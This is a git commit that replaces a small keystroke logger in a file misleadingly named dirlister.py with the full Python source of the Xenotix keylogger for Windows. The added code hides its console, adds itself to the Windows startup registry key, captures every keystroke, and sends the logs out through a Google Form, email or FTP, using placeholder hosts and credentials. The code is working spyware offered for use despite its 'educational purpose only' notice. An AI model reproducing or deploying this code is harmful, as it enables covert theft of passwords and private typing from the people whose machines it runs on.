330f7fe3a426384b2f7573a7e0a305400374620f
keptom <33152167+keptom@users.noreply.github.com>
2017-11-07 07:03:39 -0800

    Update dirlister.py

--- dirlister.py
+++ dirlister.py
@@ -1,75 +1,228 @@
-from ctypes import *
-import pythoncom
-import pyHook 
-import win32clipboard
+'''
+Xenotix Python Keylogger for Windows
+====================================
+Coded By: Ajin Abraham <ajin25@gmail.com>
+Website: http://opensecurity.in/xenotix-python-keylogger-for-windows/
+GitHub: https://github.com/ajinabraham/Xenotix-Python-Keylogger
+FEATURES
+========
+1.STORE LOGS LOCALLY
+2.SEND LOGS TO GOOGLE FORMS
+3.SEND LOGS TO EMAIL
+4.SEND LOGS TO FTP
+MINIMUM REQUIREMENTS
+===================
+Python 2.7: http://www.python.org/getit/
+pyHook Module: http://sourceforge.net/projects/pyhook/
+pyrhoncom Module: http://sourceforge.net/projects/pywin32/
+pyHook Module - 
+Unofficial Windows Binaries for Python Extension Packages: http://www.lfd.uci.edu/~gohlke/pythonlibs/
+NOTE: YOU ARE FREE TO COPY,MODIFY,REUSE THE SOURCE CODE FOR EDUCATIONAL PURPOSE ONLY.
+'''
+try:
+    import pythoncom, pyHook
+except:
+    print "Please Install pythoncom and pyHook modules"
+    exit(0)
+import os
+import sys
+import threading
+import urllib,urllib2
+import smtplib
+import ftplib
+import datetime,time
+import win32event, win32api, winerror
+from _winreg import *
 
-user32   = windll.user32
-kernel32 = windll.kernel32
-psapi    = windll.psapi
-current_window = None
+#Disallowing Multiple Instance
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
+if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
+    mutex = None
+    print "Multiple Instance not Allowed"
+    exit(0)
+x=''
+data=''
+count=0
 
-def get_current_process():
-
-    # get a handle to the foreground window
-    hwnd = user32.GetForegroundWindow()
-
-    # find the process ID
-    pid = c_ulong(0)
-    user32.GetWindowThreadProcessId(hwnd, byref(pid))
-
-    # store the current process ID
-    process_id = "%d" % pid.value
-
-    # grab the executable
-    executable = create_string_buffer("\x00" * 512)
-    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
-
-    psapi.GetModuleBaseNameA(h_process,None,byref(executable),512)
-
-    # now read it's title
-    window_title = create_string_buffer("\x00" * 512)
-    length = user32.GetWindowTextA(hwnd, byref(window_title),512)
-
-    # print out the header if we're in the right process
-    print
-    print "[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value)
-    print
-  
-
-    # close handles
-    kernel32.CloseHandle(hwnd)
-    kernel32.CloseHandle(h_process)
-    
-def KeyStroke(event):
-
-    global current_window   
-
-    # check to see if target changed windows
-    if event.WindowName != current_window:
-        current_window = event.WindowName        
-        get_current_process()
-
-    # if they pressed a standard key
-    if event.Ascii > 32 and event.Ascii < 127:
-        print chr(event.Ascii),
-    else:
-        # if [Ctrl-V], get the value on the clipboard
-        # added by Dan Frisch 2014
-        if event.Key == "V":
-            win32clipboard.OpenClipboard()
-            pasted_value = win32clipboard.GetClipboardData()
-            win32clipboard.CloseClipboard()
-            print "[PASTE] - %s" % (pasted_value),
-        else:
-            print "[%s]" % event.Key,
-
-    # pass execution to next hook registered 
+#Hide Console
+def hide():
+    import win32console,win32gui
+    window = win32console.GetConsoleWindow()
+    win32gui.ShowWindow(window,0)
     return True
 
-# create and register a hook manager 
-kl         = pyHook.HookManager()
-kl.KeyDown = KeyStroke
+def msg():
+    print """\n \nXenotix Python Keylogger for Windows
+Coder: Ajin Abraham <ajin25@gmail.com>
+OPENSECURITY.IN
+usage:xenotix_python_logger.py mode [optional:startup]
+mode:
+     local: store the logs in a file [keylogs.txt]
+     
+     remote: send the logs to a Google Form. You must specify the Form URL and Field Name in the script.
+     
+     email: send the logs to an email. You must specify (SERVER,PORT,USERNAME,PASSWORD,TO).
+     
+     ftp: upload logs file to an FTP account. You must specify (SERVER,USERNAME,PASSWORD,SSL OPTION,OUTPUT DIRECTORY).
+[optional] startup: This will add the keylogger to windows startup.\n\n"""
+    return True
 
-# register the hook and execute forever
-kl.HookKeyboard()
+# Add to startup
+def addStartup():
+    fp=os.path.dirname(os.path.realpath(__file__))
+    file_name=sys.argv[0].split("\\")[-1]
+    new_file_path=fp+"\\"+file_name
+    keyVal= r'Software\Microsoft\Windows\CurrentVersion\Run'
+
+    key2change= OpenKey(HKEY_CURRENT_USER,
+    keyVal,0,KEY_ALL_ACCESS)
+
+    SetValueEx(key2change, "Xenotix Keylogger",0,REG_SZ, new_file_path)
+
+#Local Keylogger
+def local():
+    global data
+    if len(data)>100:
+        fp=open("keylogs.txt","a")
+        fp.write(data)
+        fp.close()
+        data=''
+    return True
+
+#Remote Google Form logs post
+def remote():
+    global data
+    if len(data)>100:
+        url="https://docs.google.com/forms/d/xxxxxxxxxxxxxxxxxxxxxxxxxxxxx" #Specify Google Form URL here
+        klog={'entry.xxxxxxxxxxx':data} #Specify the Field Name here
+        try:
+            dataenc=urllib.urlencode(klog)
+            req=urllib2.Request(url,dataenc)
+            response=urllib2.urlopen(req)
+            data=''
+        except Exception as e:
+            print e
+    return True
+
+#Email Logs
+class TimerClass(threading.Thread):
+    def __init__(self):
+        threading.Thread.__init__(self)
+        self.event = threading.Event()
+    def run(self):
+        while not self.event.is_set():
+            global data
+            if len(data)>100:
+                ts = datetime.datetime.now()
+                SERVER = "smtp.gmail.com" #Specify Server Here
+                PORT = 587 #Specify Port Here
+                USER="your_email@gmail.com"#Specify Username Here 
+                PASS="password_here"#Specify Password Here
+                FROM = USER#From address is taken from username
+                TO = ["to_address@gmail.com"] #Specify to address.Use comma if more than one to address is needed.
+                SUBJECT = "Keylogger data: "+str(ts)
+                MESSAGE = data
+                message = """\
+From: %s
+To: %s
+Subject: %s
+%s
+""" % (FROM, ", ".join(TO), SUBJECT, MESSAGE)
+                try:
+                    server = smtplib.SMTP()
+                    server.connect(SERVER,PORT)
+                    server.starttls()
+                    server.login(USER,PASS)
+                    server.sendmail(FROM, TO, message)
+                    data=''
+                    server.quit()
+                except Exception as e:
+                    print e
+            self.event.wait(120)
+
+#Upload logs to FTP account
+def ftp():
+    global data,count
+    if len(data)>100:
+        count+=1
+        FILENAME="logs-"+str(count)+".txt"
+        fp=open(FILENAME,"a")
+        fp.write(data)
+        fp.close()
+        data=''
+        try:
+            SERVER="ftp.xxxxxx.com" #Specify your FTP Server address
+            USERNAME="ftp_username" #Specify your FTP Username
+            PASSWORD="ftp_password" #Specify your FTP Password
+            SSL=0 #Set 1 for SSL and 0 for normal connection
+            OUTPUT_DIR="/" #Specify output directory here
+            if SSL==0:
+                ft=ftplib.FTP(SERVER,USERNAME,PASSWORD)
+            elif SSL==1:
+                ft=ftplib.FTP_TLS(SERVER,USERNAME,PASSWORD)
+            ft.cwd(OUTPUT_DIR)
+            fp=open(FILENAME,'rb')
+            cmd= 'STOR' +' '+FILENAME
+            ft.storbinary(cmd,fp)
+            ft.quit()
+            fp.close()
+            os.remove(FILENAME)
+        except Exception as e:
+            print e
+    return True
+
+def main():
+    global x
+    if len(sys.argv)==1:
+        msg()
+        exit(0)
+    else:
+        if len(sys.argv)>2:
+            if sys.argv[2]=="startup":
+                addStartup() 
+            else:
+                msg()
+                exit(0)
+        if sys.argv[1]=="local":
+            x=1
+            hide()
+        elif sys.argv[1]=="remote":
+            x=2
+            hide()
+        elif sys.argv[1]=="email":
+            hide()
+            email=TimerClass()
+            email.start()
+        elif sys.argv[1]=="ftp":
+            x=4
+            hide()
+        else:
+            msg()
+            exit(0)
+    return True
+
+if __name__ == '__main__':
+    main()
+
+def keypressed(event):
+    global x,data
+    if event.Ascii==13:
+        keys='<ENTER>'
+    elif event.Ascii==8:
+        keys='<BACK SPACE>'
+    elif event.Ascii==9:
+        keys='<TAB>'
+    else:
+        keys=chr(event.Ascii)
+    data=data+keys 
+    if x==1:  
+        local()
+    elif x==2:
+        remote()
+    elif x==4:
+        ftp()
+
+obj = pyHook.HookManager()
+obj.KeyDown = keypressed
+obj.HookKeyboard()
 pythoncom.PumpMessages()
